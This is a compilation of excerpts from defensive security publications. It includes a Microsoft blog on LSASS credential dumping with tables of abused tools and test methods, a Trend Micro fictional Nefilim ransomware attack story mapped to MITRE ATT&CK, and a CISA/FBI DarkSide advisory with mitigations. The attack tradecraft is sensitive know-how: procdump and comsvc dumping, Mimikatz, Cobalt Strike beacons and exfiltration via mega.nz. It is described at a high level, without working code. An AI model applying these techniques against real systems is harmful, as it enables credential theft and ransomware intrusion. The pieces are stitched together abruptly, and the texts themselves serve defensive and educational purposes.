attackers to move laterally \nundetected through a network.\n\n•\t Use application allow lists where applicable.\n\n•\t Implement offline backups that are onsite. Make sure you have backups that are not connected to the \nnetwork to prevent them from being encrypted by ransomware. \n\n•\t Test restore capability. Ensure restore capabilities support the needs of the business. \n\n•\t Educate staff to ensure they understand cyber security principles and do not engage in any behaviors that \nmay put network security at risk. \n\n\n\nFor product information and a complete list of distributors, visit our website at: broadcom.com\nCopyright © 2021 Broadcom.

One technique attackers use is targeting credentials in the Windows Local\nSecurity Authority Subsystem Service (LSASS) process memory because it can store not\nonly a current user’s OS credentials but also a domain admin’s.\n\nLSASS credential dumping was first observed in the tactics, techniques, and procedures\n(TTPs) of several sophisticated threat activity groups—including actors that Microsoft tracks\nas HAFNIUM and GALLIUM— and has become prevalent even in the cybercrime space,\nespecially with the rise of the ransomware as a service gig economy. Detecting and stopping\nOS credential theft is therefore important because it can spell the difference between\ncompromising or encrypting one device versus an entire network. Security solutions must\n\nhttps://www.microsoft.com/security/blog/2022/10/05/detecting-and-preventing-lsass-credential-dumping-attacks/\nhttps://attack.mitre.org/techniques/T1003/001/\nhttps://www.microsoft.com/en-us/security/blog/2021/03/02/hafnium-targeting-exchange-servers/\nhttps://www.microsoft.com/en-us/security/blog/2019/12/12/gallium-targeting-global-telecom/\nhttps://www.microsoft.com/en-us/security/blog/2020/03/05/human-operated-ransomware-attacks-a-preventable-disaster/\n\n\n2/6\n\nprovide specific measures and capabilities to help harden the LSASS process—for example,\nMicrosoft Defender for Endpoint has advanced detections and a dedicated attack surface\nreduction rule (ASR) to block credential stealing from LSASS.\n\nIn May 2022, Microsoft participated in an evaluation conducted by independent testing\norganization AV-Comparatives specifically on detecting and blocking the LSASS credential\ndumping technique. The test, which evaluated several endpoint protection platforms (EPP)\nand endpoint detection and response (EDR) vendors, is the first time AV-Comparatives\nfocused on a single attack technique, and we’re happy to report that Defender for Endpoint\npassed all 15 test cases used to dump user OS credentials from the LSASS process,\nachieving 100% detection and prevention scores. Notably, we also passed all test cases\nwith only Defender for Endpoint’s default settings configured, that is, with LSASS ASR\nand Protective Process Light (PPL) turned off to validate our antivirus protection durability in\nitself. Such results demonstrate our continued commitment to provide organizations with\nindustry-leading defense.\n\nIn this blog, we share examples of various threat actors that we’ve recently observed using\nthe LSASS credential dumping technique. We also provide details on the testing\nmethodology done by AV-Comparatives, which they also shared in their blog and detailed\nreport. Finally, we offer additional recommendations to further harden systems and prevent\nattackers from taking advantage of possible misconfigurations should they fail to leverage\ncredential dumping.\n\nLSASS credential dumping: What we see in the wild\n\nDumping LSASS credentials is important for attackers because if they successfully dump\ndomain passwords, they can, for example, then use legitimate tools such as PsExec or\nWindows Management Instrumentation (WMI) to move laterally across the network. They\ncan also use techniques like pass-the-hash for lateral movement if they manage to obtain the\npassword hashes.\n\nMicrosoft researchers are constantly monitoring the threat landscape, including the different\nways threat actors attempt to steal user credentials. The table below is a snapshot of the\nmost popular credential theft techniques these actors used from March to August 2022\nbased on our threat data:\n\nLiving-off-the-land binary (LOLBin) or\nhacking tool\n\nThreat actor that frequently uses this\n(not exhaustive)\n\nComsvc.dll (and its “MiniDump” export)\nloaded by rundll32.exe\n\nDEV-0270\n\nMimikatz (and its modified variants) DEV-0674\n\nhttps://www.microsoft.com/security/business/threat-protection/endpoint-defender\nhttps://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction\nhttps://www.av-comparatives.org/\nhttps://www.av-comparatives.org/lsass-credential-dumping-security/\nhttps://www.av-comparatives.org/wp-content/uploads/2022/09/avc_sp_lsass_ms_2022.pdf\nhttps://attack.mitre.org/techniques/T1550/002/\nhttps://github.com/LOLBAS-Project/LOLBAS/blob/master/README.md\nhttps://www.microsoft.com/en-us/security/blog/2022/09/07/profiling-dev-0270-phosphorus-ransomware-operations/\n\n\n3/6\n\nProcdump.exe (with -ma command line\noption)\n\nDEV-0555\n\nTaskmgr.exe DEV-0300\n\nThe first column shows the technique attackers most frequently used in their attempt to\ndump credentials from LSASS, while the second column shows which threat actor uses this\ntechnique most frequently. Based on the incidents we tracked from March to August 2022,\ncredential theft attacks using  LOLBins such as comsvc.dll, procdump.exe, or taskmgr.exe\nare still popular. These LOLBins are legitimate, digitally signed binaries that are either\nalready present on the target device or are downloaded onto the system for the attacker to\nmisuse for malicious activities.\n\nMicrosoft Defender Antivirus prevents the execution of these command lines due to its\nsynchronous command line-blocking capabilities.\n\nAV-Comparatives test\n\nTo evaluate EPP and EDR capabilities against the LSASS credential dumping technique, AV-\nComparatives ran 15 different test cases to dump credentials from the LSASS process using\nboth publicly available hacking tools like Mimikatz (which the tester modified to bypass\nantivirus signatures) and privately developed ones. These test cases were as follows:\n\nTest case LSASS attack method\n\n01 Mimikatz with process herpaderping\n\n02 Native APIs DLL\n\n03 Silent process exit\n\n04 Alternative API snapshot function\n\n05 MalSecLogon\n\n06 Dump LSASS\n\n07 Duplicate dump\n\n08 PowerShell Mimikatz\n\n09 Invoke Mimikatz (PoshC2)\n\n10 SafetyDump\n\n11 RunPE snapshot (PoshC2)\n\n12 Unhook (Metasploit framework)\n\n\n\n4/6\n\n13 Reflective DLL (Metasploit framework)\n\n14 Invoke Mimikatz (PowerShell Empire)\n\n15 Invoke-PPL dump (PowerShell Empire)\n\nEach test case implemented a comprehensive approach on how to dump credentials from\nLSASS. After the evaluation, AV-Comparatives shared the logs and detailed description of\nthe test cases. Microsoft participated using Defender for Endpoint, both its antivirus and EDR\ncapabilities, with only the default settings configured.\n\nDuring the initial run, Defender for Endpoint prevented 11 out of 15 test cases and\nalerted/detected three of the remaining ones (Figure 1). We then made improvements in our\nprotection and detection capabilities and asked AV-Comparatives to re-test the missed test\ncases. During the re-test, we prevented all the remaining four test cases, achieving 15 out of\n15 prevention score.\n\nFigure 1. Table showing how Defender for Endpoint prevented/detected the test cases in the\nfirst run of the AV-Comparatives test. The antivirus module missed test cases 01, 03, 09, and\n10. We added improvements to the product based on these findings, thus allowing Defender\nfor Endpoint to achieve 100% prevention score on re-test. (Source: AV-Comparatives)\n\nhttps://www.av-comparatives.org/wp-content/uploads/2022/09/avc_sp_lsass_ms_2022.pdf\n\n\n5/6\n\nWe’d like to thank AV-Comparatives for this thorough test, which led us to improve our\nprotection and detection capabilities in Defender for Endpoint. These improvements have\nalready been rolled out to benefit our customers, and we’re looking forward to the next\nsimilar test. We aim to provide industry-leading, cross-domain defense, so it’s important for\nus to participate in tests like AV-Comparatives and MITRE Engenuity ATT&CK Evaluations\nbecause they help us ensure that we’re delivering solutions that empower organizations to\ndefend their environments.\n\nSecuring the LSASS process with coordinated threat defense and\nsystem hardening\n\nThe continuous evolution of the threat landscape has seen attacks leveraging OS credential\ntheft, and threat actors will continue to find new ways to dump LSASS credentials in their\nattempts to evade detection. For Microsoft, our industry-leading defense capabilities in\nMicrosoft Defender for Endpoint are able to detect such attempts. We’ve also introduced new\nsecurity features in Windows 11 to harden the operating system, such as enabling PPL for\nthe LSASS process and Credential Guard by default. However, evaluations like this AV-\nComparatives test go hand in hand with threat monitoring and research because they\nprovide security vendors additional insights and opportunities to continuously improve\ncapabilities.\n\nOur teams performed an in-house test of all these test cases with the LSASS ASR rule\nenabled to check the protection level of that rule. We’re happy to report that the ASR rule\nalone successfully prevented all the tested techniques. The LSASS ASR rule is a generic yet\neffective protection our customers can implement to stop currently known user-mode LSASS\ncredential dumping attacks. Defender customers should therefore enable this ASR rule—\nalong with tamper protection—as an added protection layer for the LSASS process.\n\nOn top of the various dumping techniques, we’ve also observed threat actors attempt to\nweaken the device settings in case they can’t dump credentials. For example, they attempt\nto enable “UseLogonCredential” in WDigest registry, which enables plaintext passwords in\nmemory. Microsoft Defender Antivirus detects such techniques, too, as\nBehavior:Win32/WDigestNegMod.B.\n\nWindows administrators can also perform the following to further harden the LSASS process\non their devices:\n\nEnable PPL for LSASS process; note that for new, enterprise-joined Windows 11\ninstalls (22H2 update), this is already enabled by default\nEnable Windows Defender Credential Guard; this is also now enabled by default for\norganizations using the Enterprise edition of Windows 11\nEnable restricted admin mode for Remote Desktop Protocol (RDP)\nDisable “UseLogonCredential” in WDigest\n\nhttps://www.microsoft.com/en-us/security/blog/2022/03/31/microsoft-protects-against-human-operated-ransomware-across-the-full-attack-chain-in-the-2022-mitre-engenuity-attck-evaluations/\nhttps://www.microsoft.com/security/business/endpoint-security/microsoft-defender-endpoint\nhttps://www.microsoft.com/en-us/security/blog/2022/04/05/new-security-features-for-windows-11-will-help-protect-hybrid-work/\nhttps://learn.microsoft.com/microsoft-365/security/defender-endpoint/attack-surface-reduction-rules-reference#block-credential-stealing-from-the-windows-local-security-authority-subsystem\nhttps://support.microsoft.com/windows/prevent-changes-to-security-settings-with-tamper-protection-31d51aaa-645d-408e-6ce7-8d7f8e593f87\nhttps://learn.microsoft.com/windows-server/security/credentials-protection-and-management/configuring-additional-lsa-protection#BKMK_HowToConfigure\nhttps://learn.microsoft.com/windows/security/identity-protection/credential-guard/credential-guard-manage#enable-windows-defender-credential-guard\nhttps://learn.microsoft.com/archive/blogs/kfalde/restricted-admin-mode-for-rdp-in-windows-7-2008-r2\nhttps://support.microsoft.com/topic/microsoft-security-advisory-update-to-improve-credentials-protection-and-management-may-13-2014-93434251-04ac-b7f3-52aa-9f951c14b649\n\n\n6/6\n\nFinally, customers with Azure Active Directory (Azure AD) can follow our recommendations\non hardening environments:",

It is operated by a group that we track under the intrusion set \"Water Roc\". This group\ncombines advanced techniques with legitimate tools to make them significantly harder to detect and\nrespond before it is too late.\n\nThis allows them to remain undetected in the system for weeks, navigating across the environment to\nmaximize their damage. Before the attack is even initiated, deep victim profiling is done, allowing them to\nuse victim-specific extortion pricing to tailor the ransom.\n\nNefilim is a Ransomware as a Service(RaaS) operation first discovered in March 2020, and believed to\nhave evolved from the earlier Nemty ransomware family. They target multi-billion dollar companies, primarily\nbased in North or South America, in the financial, manufacturing or transportation industries. They operate\nunder a profit share model, where Nefilim earns 30% for their ransomware service, and the remaining 70%\ngoes to the affiliates who provide the network access and implements the active phase of the attack.\n\nLike all ransomware, recovery is dependent on an external backup drive or paying for the encryption key, as\nNefilim ransomware replaces the original files with encrypted versions.\n\nhttps://www.trendmicro.com/en_us/research/21/f/nefilim-modern-ransomware-attack-story.html\nhttps://www.trendmicro.com/en_us/research/21/e/stop-ransomware-groups-who-weaponize-legitimate-tools.html\nhttps://www.trendmicro.com/en_us/research/21/b/nefilim-ransomware.html\nhttps://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/nefilim-ransomware-threatens-to-expose-stolen-data\n\n\n2/16\n\nAlong with a new wave of double extortion ransomware families, Nefilim affiliates are particularly vicious\nwhen victims don’t immediately pay the ransom, leaking their sensitive data over an extended period of\ntime. They are one of few groups that host leaked victim data long-term, for months to years, using it to\ndeliver a chilling message to future victims.\n\nThe following is a fictional use case built using an in-depth case study of the Nefilim ransomware family to\ndemonstrate how their typical attack process occurs. The story leverages the MITRE ATT&CK Framework\nto define each tactic and technique used, with a detailed table below for further technical information.\n\nVictim Use Case of Nefilim\n\nMeet Company X, a fictional company serving the purpose of being the victim of a typical Nefilim\nransomware attack. Company X is a global manufacturing organization with a yearly revenue of US$1\nBillion and headquartered in North America, making them an ideal target of Nefilim.\n\nInfiltrating the Environment\n\nDuring their active vulnerability scanning (T1595.002) of Company X’s internet facing hosts, the adversaries\nfind that X has not patched a Citrix Application Delivery Controller vulnerability (CVE-2019-19781). This is a\nvulnerability they can exploit to gain initial access (T1133) through the exposed Remote Desktop Protocol\n(RDP), and so the attack begins!\n\nX’s security team should have maintained an inventory of their exposed services across their environment,\nperiodically scanning for vulnerabilities so they can proactively mitigate any potential inroads to their\nnetwork. Internet-facing systems such as Citrix should always be a patching priority and managed with\nstrong access controls. Access can be limited with a least-privileged administrative model and a strong\nmultifactor authentication system (M1032) to strengthen account security and prevent credential access. If\nthe RDP is unnecessary, which may be why it was left unpatched, then it should be disabled or blocked\n(M1042). Network proxies, gateways, and firewalls can also be leveraged to deny direct remote access to\nthe internal system, blocking the inroad by which the adversaries are entering. \n\nIntrusion Prevention Systems (IPS) can provide an additional layer of protection in advance of patch\navailability or patch deployment, which is particularly important with preventing targeted ransomware\nattacks, such as this one. IPS logs also provide relevant information for detecting initial access activities.\n\nOnce the actors have successfully infiltrated X’s network, they begin downloading the additional tools they\nwill need to further their plot (T1608). They download a Cobalt Strike beacon to establish a backdoor and\npersistent access to the environment so they can remotely execute commands, and later exfiltrate the data.\nThis beacon is connected back to one of their pre-established shell companies that hosts their Cobalt Strike\nCommand and Control (C&C) server. They also download Process Hacker to stop endpoint security agents\n(T1489), and Mimikatz to dump credentials (T1003.001), along with other tools they will need throughout\ntheir attack.\n\nThe adversaries need elevated permissions to run certain tools as administrators. They take advantage of\nanother unpatched vulnerability in X’s system (T1068), a Windows COM Elevation of Privilege Vulnerability\n(CVE-2017-0213). Armed with elevated permissions and credentials courtesy of Mimikatz, they are ready to\ncontinue their invasion.\n\nThe use of multiple vulnerabilities that were disclosed several years ago is a reminder of the importance of\ntimely software updating (M1051) and patch management. A threat intelligence program can be developed\nto help identify what software exploits and N-day vulnerabilities may have the most impact on an\norganization (M1019). Virtual patching programs can enhance existing patch management processes to\n\nhttps://www.trendmicro.com/vinfo/tmr/?/us/security/definition/ransomware#Ransomware_Evolved_Modern_Ransomware\nhttps://www.trendmicro.com/vinfo/tmr/?/us/security/news/cybercrime-and-digital-threats/modern-ransomwares-double-extortion-tactics-and-how-to-protect-enterprises-against-them\nhttps://attack.mitre.org/techniques/enterprise/\nhttps://nvd.nist.gov/vuln/detail/CVE-2019-19781\nhttps://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2017-0213\n\n\n3/16\n\nfurther defend against known and unknown vulnerabilities. Application isolation and sandboxing can also be\nused to mitigate the impact of advisories taking advantage of unpatched vulnerabilities (M1048). Ultimately,\nan organization needs good application security that looks for and detects exploitation behavior.\n\nMimikatz is a popular tool used for credential dumping of plaintext passwords, hashes, Kerberos tickets and\nother sensitive data from memory. It can also be used to gain access to other systems within the network\nthrough a pass-the-hash attack (T1550). However, Mimikatz has no major legitimate use that would explain\nadmins having it on their system, so this tool should be treated as suspicious in most cases.\n\nMitigations can be established through strict account management and Active Directory Audit\nPolicies. Enforcing the least-privileged administrative Model (M1018) and limiting credential overlap (M1026)\nacross systems helps to further prevent compromised credential enabling lateral movement.\n\nCompleting the Invasion\n\nThe attackers take advantage of tools that already exist in the system to move laterally and expand their\ninvasion (T1570). They use PsExec to launch taskkill to stop services that could alert X’s security team, and\nto stop backup services (T1489). AdFind gives them vital information about the active directory setup which\nthey use to map out X’s infrastructure and find other targets of interest (T1018). Over time, they move\nthroughout X’s entire environment, including peripheral devices (T1120) and shared drives (T1135),\nidentifying all the valuable data (T1083), and then using PowerShell commands, they strategically drop\nCobalt Strike beacons in specific systems important to their attack as they go.\n\nNetwork intrusion detection and prevention systems (M1031) are critical to mitigate adversary activity after\ninitial access at the network level. These systems can help security teams see that they’ve been breached\nand track the attacker’s activities with sensors at the network, cloud, and endpoint/server layers. Network\nsegmentation and micro segmentation can help to inhibit lateral movement and support security monitoring.\n\nExfiltration for Encryption\n\nThe attackers use automated exfiltration (T1020) with their existing C&C channels established with the\nCobalt Strike beacons set up across X’s environment (T1041). The sensitive data is stolen using file transfer\nprotocols (FTP) in fixed size chucks to avoid triggering network data transfer threshold alerts (T1030). For\nany large files, they use mega.nz to callback the data over the legitimate web service (T1567).\n\nTo prevent the exfiltration of data, web-based content can be restricted (M1021) and network traffic can be\nfiltered (M1037). Any suspicious DNS, HTTP and HTTPS connections should be monitored or blocked\nentirely. AV software should also be kept up-to-date with machine learning plug-ins. As a rule of thumb, it is\nimportant to block any traffic to a Cobalt Strike C&C server, however since Cobalt Strike is designed to\nevade security measures, a multilayer approach is needed for this to be effective.\n\nExecution of Ransomware\n\nAfter a few weeks, the attackers are satisfied that they have identified all valuable data within X’s\nenvironment. They wait until a weekend to help ensure they remain undetected, and then they deploy the\nNefilim ransomware on X’s network. The ransom note is prepared for decryption, then Nefilim imports an\nRSA-2048 public key and leaves it ready to use for encryption. The Nefilim payload is executed with a\ncommand-line argument (T1059) containing the full path of directory with the files identified to be encrypted.\nAll of X’s logical drives are encrypted, and a decrypted ransom note named “NEFILIM-DECRYPT.txt” is\nwritten for each one.\n\nhttps://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/audit-policy-recommendations\n\n\n4/16\n\nBefore starting to encrypt the files, Nefilim checks if they match its exclusion list of files and directory names.\nWith this confirmed, Nefilim encrypts the file contents (T1486), and then replaces the original content with\nthe encrypted version. After which it erases the encryption keys from memory and removes itself 3 seconds\nafter, deleting its path.\n\nCompany X’s CISO returns to work after a relaxing weekend to find her worst nightmare. She has been the\nvictim of a Nefilim ransomware attack.\n\nAfter verifying the attack, she receives the ransom specifically tailored to her company for maximum\nextortion. She must now make the toughest decision of her career; does she pay the ransom? Or risk all of\nCompany X’s sensitive data being leaked and the lawsuit that will follow that?\n\nHow Could This Have Been Prevented?\n\nWhen evaluating your protection against ransomware, you should start with auditing your ability to detect\nthe impact techniques. This tactic is used to attempt to inhibit an organization’s recovery ability and the\ntechniques used are the best indicators of a potential ransomware attack. Nefilim ransomware binaries are\nstraightforward, so general ransomware mitigation techniques would protect against this ransomware family.\n\nThe adversaries stopped services throughout the lifecycle of their attack over several weeks (T1489). These\nactions could be prevented with permission restrictions (M1022 & M1024) and network segmentation\n(M1030) techniques. The risk of an attacker seeing and interfering with critical response functions can be\ndecreased by separating the networks that operate intrusion detection, analysis and response systems from\nthe production environment. Critical services can be protected from interference or being disabled by\nattackers by restricting registry and directory permissions. Ultimately, secure account management (M1018)\nis important to ensure only authorized admins have access to critical services.\n\nOrganization’s security teams can also consider developing disaster recovery plans for situations like a\nsuccessful ransomware attack. These plans can also contain proactive processes such as routine data\nback-up (M1053) and testing the security of the back-up drives that can be used to recover from an attack.\n\n\n\n5/16\n\nThese back-ups should be stored securely off the system and versioning enabled in cloud environments to\nmake copies of the backups. However, this does not stop the stolen data from being leaked, so prevention\nis key with modern ransomware attacks.\n\nThe Answer to Modern Ransomware Prevention\n\nWith most organizations using multiple, separate security layers, threat information is siloed, with an endless\namount of uncorrelated alerts. This results in a lack of visibility, making it extremely difficult to connect the\ntraces of advanced ransomware attacks in time to prevent it. To stay ahead of modern attack techniques, a\nsolution that can look across the entire environment, correlate suspicious activity, and detect critical threats\nwith quality alerts is essential.\n\nWe have answered the challenge of modern ransomware with a purpose-built threat defense extended\ndetection and response (XDR) solution, Trend Micro Vision One. It uses native sensors and protection\npoints — coupled with XDR capabilities to stitch together threat activity across layers — enabling you to\nquickly identify complex attacks, like Nefilim ransomware, that bypass traditional prevention. This provides\nyou with the ability to run root cause analysis, look at the execution profile, and identify the scope of the\nimpact across your environment. With a broader perspective and better context to hunt, detect and contain\nthreats with fewer, higher quality alerts so you can see more and respond faster.\n\nTactic Technique Observable Mitigation Prevention\n\nReconnaissance Active Scanning:\nVulnerability Scanning\nT1595.002\n\nAttackers actively\nscan for internet-\nfacing hosts that\nare vulnerable to\nrecently\ndisclosed\nexploits. \n\nPre-compromise\nM1056\n\nThis technique\ncannot be easily\nmitigated with\npreventive controls\nsince it is based\non behaviors\nperformed outside\nof the scope of\nenterprise\ndefenses and\ncontrols.

See the ATT&CK for Enterprise for all referenced threat\nactor tactics and techniques.\n\nThe Cybersecurity and Infrastructure Security Agency (CISA) and the Federal Bureau of\nInvestigation (FBI) are aware of a ransomware attack affecting a critical infrastructure (CI)\nentity—a pipeline company—in the United States. Malicious cyber actors deployed DarkSide\nransomware against the pipeline company’s information technology (IT) network.[1] At this\ntime, there is no indication that the entity’s operational technology (OT) networks have been\ndirectly affected by the ransomware.\n\nCISA and FBI urge CI asset owners and operators to adopt a heightened state of awareness\nand implement the recommendations listed in the Mitigations section of this Joint\nCybersecurity Advisory, including implementing robust network segmentation between IT and\nOT networks; regularly testing manual controls; and ensuring that backups are implemented,\nregularly tested, and isolated from network connections. These mitigations will help CI\nowners and operators improve their entity's functional resilience by reducing their\nvulnerability to ransomware and the risk of severe business degradation if impacted by\nransomware.\n\n(Updated May 19, 2021): Click here for a STIX package of indicators of compromise\n(IOCs). Note: These IOCs were shared with critical infrastructure partners and network\ndefenders on May 10, 2021. The applications listed in the IOCs were leveraged by the\nthreat actors during the course of a compromise. Some of these applications might\nappear within an organization's enterprise to support legitimate purposes; however,\nthese applications can be used by threat actors to aid in malicious exploitation of an\norganization's enterprise. CISA and FBI recommend removing any application not\ndeemed necessary for day-to-day operations.\n\nhttps://us-cert.cisa.gov/ncas/alerts/aa21-131a\nhttps://attack.mitre.org/versions/v8/techniques/enterprise/\nhttps://www.colpipe.com/news/press-releases/media-statement-colonial-pipeline-system-disruption\nhttps://us-cert.cisa.gov/sites/default/files/publications/AA21-131A.stix.xml\n\n\n2/7\n\n(Updated July 08, 2021): Click here for downloadable IOCs associated with a sample\nof a DarkSide ransomware variant analyzed by CISA and FBI. Note: CISA and FBI\nhave no evidence that this sample is related to the pipeline incident detailed in this\nCSA. This variant executes a dynamic-link library (DLL) program used to delete\nVolume Shadow copies available on the system. The malware collects, encrypts, and\nsends system information to the threat actor’s command and control (C2) domains and\ngenerates a ransom note to the victim. For more information about this variant, refer to\nMalware Analysis Report MAR-10337802-1.v1: DarkSide Ransomware. \n\nClick here for a PDF version of this report.\n\nTechnical Details\n\nNote: the analysis in this Joint Cybersecurity Advisory is ongoing, and the information\nprovided should not be considered comprehensive. CISA and FBI will update this advisory\nas new information is available.\n\nAfter gaining initial access to the pipeline company’s network, DarkSide actors deployed\nDarkSide ransomware against the company’s IT network. In response to the cyberattack, the\ncompany has reported that they proactively disconnected certain OT systems to ensure\nthe systems’ safety.[2] At this time, there are no indications that the threat actor moved\nlaterally to OT systems.\n\nDarkSide is ransomware-as-a-service (RaaS)—the developers of the ransomware receive a\nshare of the proceeds from the cybercriminal actors who deploy it, known as\n“affiliates.” According to open-source reporting, since August 2020, DarkSide actors have\nbeen targeting multiple large, high-revenue organizations, resulting in the encryption and\ntheft of sensitive data. The DarkSide group has publicly stated that they prefer to target\norganizations that can afford to pay large ransoms instead of hospitals, schools, non-profits,\nand governments.[3],[4]\n\nAccording to open-source reporting, DarkSide actors have previously been observed gaining\ninitial access through phishing and exploiting remotely accessible accounts and systems and\nVirtual Desktop Infrastructure (VDI) (Phishing [T1566], Exploit Public-Facing Application\n[T1190], External Remote Services [T1133]).[5],[6] DarkSide actors have also been observed\nusing Remote Desktop Protocol (RDP) to maintain Persistence [TA0003].[7]\n\nAfter gaining access, DarkSide actors deploy DarkSide ransomware to encrypt and steal\nsensitive data (Data Encrypted for Impact [T1486]). The actors then threaten to publicly\nrelease the data if the ransom is not paid.[8],[9] The DarkSide ransomware uses Salsa20\nand RSA encryption.[10]\n\nDarkSide actors primarily use The Onion Router (TOR) for Command and Control (C2)\n[TA0011] (Proxy: Multi-hop Proxy [1090.003]).[11],[12] The actors have also been observed\nusing Cobalt Strike for C2.[13]\n\nhttps://us-cert.cisa.gov/sites/default/files/publications/MAR-10337802-1.v1.WHITE_stix.xml\nhttps://us-cert.cisa.gov/ncas/analysis-reports/ar21-189a\nhttps://us-cert.cisa.gov/sites/default/files/publications/AA21-131A_Darkside_Ransomware.pdf\nhttps://www.colpipe.com/news/press-releases/media-statement-colonial-pipeline-system-disruption\nhttps://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/\nhttps://www.varonis.com/blog/darkside-ransomware/\nhttps://attack.mitre.org/versions/v9/techniques/T1566/\nhttps://attack.mitre.org/versions/v9/techniques/T1190/\nhttps://attack.mitre.org/versions/v9/techniques/T1133/\nhttps://www.bankinfosecurity.com/fbi-darkside-ransomware-used-in-colonial-pipeline-attack-a-16555\nhttps://www.varonis.com/blog/darkside-ransomware/\nhttps://attack.mitre.org/versions/v9/tactics/TA0003/\nhttps://www.varonis.com/blog/darkside-ransomware/\nhttps://attack.mitre.org/techniques/T1486/\nhttps://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/\nhttps://www.varonis.com/blog/darkside-ransomware/\nhttps://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/ransomware-details.darkside-ransomware.html\nhttps://attack.mitre.org/software/S0183/\nhttps://attack.mitre.org/versions/v9/tactics/TA0011/\nhttps://attack.mitre.org/versions/v9/techniques/T1090/003/\nhttps://securitynews.sonicwall.com/xmlpost/darkside-ransomware-targets-large-corporations-charges-up-to-2m/\nhttps://www.varonis.com/blog/darkside-ransomware/\nhttps://attack.mitre.org/versions/v9/software/S0154/\nhttps://www.mcafee.com/enterprise/en-us/threat-center/threat-landscape-dashboard/ransomware-details.darkside-ransomware.html\n\n\n3/7\n\nMitigations\n\nCISA and FBI urge CI owners and operators to apply the following mitigations to reduce the\nrisk of compromise by ransomware attacks.\n\nRequire multi-factor authentication for remote access to OT and IT networks.\nEnable strong spam filters to prevent phishing emails from reaching end users.\nFilter emails containing executable files from reaching end users.\nImplement a user training program and simulated attacks for spearphishing to\ndiscourage users from visiting malicious websites or opening malicious attachments\nand re-enforce the appropriate user responses to spearphishing emails.\nFilter network traffic to prohibit ingress and egress communications with known\nmalicious IP addresses. Prevent users from accessing malicious websites by\nimplementing URL blocklists and/or allowlists.\nUpdate software, including operating systems, applications, and firmware on IT\nnetwork assets, in a timely manner. Consider using a centralized patch management\nsystem; use a risk-based assessment strategy to determine which OT network assets\nand zones should participate in the patch management program.\nLimit access to resources over networks, especially by restricting RDP. After\nassessing risks, if RDP is deemed operationally necessary, restrict the originating\nsources and require multi-factor authentication.\nSet antivirus/antimalware programs to conduct regular scans of IT network assets\nusing up-to-date signatures. Use a risk-based asset inventory strategy to determine\nhow OT network assets are identified and evaluated for the presence of malware.\nImplement unauthorized execution prevention by: \n\nDisabling macro scripts from Microsoft Office files transmitted via email.\nConsider using Office Viewer software to open Microsoft Office files transmitted\nvia email instead of full Microsoft Office suite applications.\nImplementing application allowlisting, which only allows systems to execute\nprograms known and permitted by security policy. Implement software restriction\npolicies (SRPs) or other controls to prevent programs from executing from\ncommon ransomware locations, such as temporary folders supporting popular\ninternet browsers or compression/decompression programs, including the\nAppData/LocalAppData  folder.\n\nMonitor and/or block inbound connections from Tor exit nodes and other\nanonymization services to IP addresses and ports for which external\nconnections are not expected (i.e., other than VPN gateways, mail ports, web\nports). For more guidance, refer to Joint Cybersecurity Advisory AA20-183A:\nDefending Against Malicious Cyber Activity Originating from Tor.\nDeploy signatures to detect and/or block inbound connection from Cobalt\nStrike servers and other post exploitation tools.\n\nhttps://us-cert.cisa.gov/ncas/alerts/aa20-183a\n\n\n4/7\n\nCISA and FBI urge CI owners and operators to apply the following mitigations now to reduce\nthe risk of severe business or functional degradation should their CI entity fall victim to a\nransomware attack in the future.\n\nImplement and ensure robust network segmentation between IT and OT\nnetworks to limit the ability of adversaries to pivot to the OT network even if the IT\nnetwork is compromised. Define a demilitarized zone that eliminates unregulated\ncommunication between the IT and OT networks.\nOrganize OT assets into logical zones by taking into account criticality,\nconsequence, and operational necessity. Define acceptable communication conduits\nbetween the zones and deploy security controls to filter network traffic and monitor\ncommunications between zones. Prohibit industrial control system (ICS) protocols from\ntraversing the IT network.\nIdentify OT and IT network inter-dependencies and develop workarounds or\nmanual controls to ensure ICS networks can be isolated if the connections create risk\nto the safe and reliable operation of OT processes. Regularly test contingency plans\nsuch as manual controls so that safety critical functions can be maintained during a\ncyber incident. Ensure that the OT network can operate at necessary capacity even if\nthe IT network is compromised. \nRegularly test manual controls so that critical functions can be kept running if ICS or\nOT networks need to be taken offline.\n\n\n\n5/7\n\nImplement regular data backup procedures on both the IT and OT networks.\nBackup procedures should be conducted on a frequent, regular basis. The data backup\nprocedures should also address the following best practices:\n\nEnsure that backups are regularly tested.\nStore your backups separately. Backups should be isolated from network\nconnections that could enable the spread of ransomware. It is important that\nbackups be maintained offline as many ransomware variants attempt to find and\nencrypt or delete accessible backups. Maintaining current backups offline is\ncritical because if your network data is encrypted with ransomware, your\norganization can restore systems to its previous state. Best practice is to store\nyour backups on a separate device that cannot be accessed from a network,\nsuch as on an external hard drive. (See the Software Engineering Institute’s page\non ransomware).\nMaintain regularly updated “gold images” of critical systems in the event\nthey need to be rebuilt. This entails maintaining image “templates” that include\na preconfigured operating system (OS) and associated software applications that\ncan be quickly deployed to rebuild a system, such as a virtual machine or server.\nRetain backup hardware to rebuild systems in the event rebuilding the primary\nsystem is not preferred. Hardware that is newer or older than the primary system\ncan present installation or compatibility hurdles when rebuilding from images.\nStore source code or executables. It is more efficient to rebuild from system\nimages, but some images will not install on different hardware or platforms\ncorrectly; having separate access to needed software will help in these cases.\n\nEnsure user and process accounts are limited through account use policies,\nuser account control, and privileged account management. Organize access rights\nbased on the principles of least privilege and separation of duties.\n\nIf your organization is impacted by a ransomware incident, CISA and FBI recommend the\nfollowing actions:\n\nIsolate the infected system. Remove the infected system from all networks, and\ndisable the computer’s wireless, Bluetooth, and any other potential networking\ncapabilities. Ensure all shared and networked drives are disconnected, whether wired\nor wireless.  \n\nhttps://insights.sei.cmu.edu/sei_blog/2017/05/ransomware-best-practices-for-prevention-and-response.html\n\n\n6/7\n\nTurn off other computers and devices. Power-off and segregate (i.e., remove from\nthe network) the infected computer(s). Power-off and segregate any other computers or\ndevices that shared a network with the infected computer(s) that have not been fully\nencrypted by ransomware. If possible, collect and secure all infected and potentially\ninfected computers and devices in a central location, making sure to clearly label any\ncomputers that have been encrypted. Powering-off and segregating infected computers\nand computers that have not been fully encrypted may allow for the recovery of\npartially encrypted files by specialists. (See Before You Connect a New Computer to\nthe 